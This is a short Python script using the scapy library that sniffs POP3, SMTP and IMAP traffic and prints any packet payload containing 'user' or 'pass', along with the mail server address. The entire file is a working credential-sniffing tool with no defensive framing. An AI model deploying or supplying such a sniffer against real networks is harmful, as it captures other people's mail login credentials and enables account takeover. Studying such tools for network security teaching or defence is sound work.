from scapy.all import *


def packet_handler(packet):
    # print(packet.show())
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print("[*] Server: %s" % packet[IP].dst)
            print("[*] %s" % packet[TCP].payload)

def main():
    sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_handler, store=0)



if __name__ == "__main__":
    main()
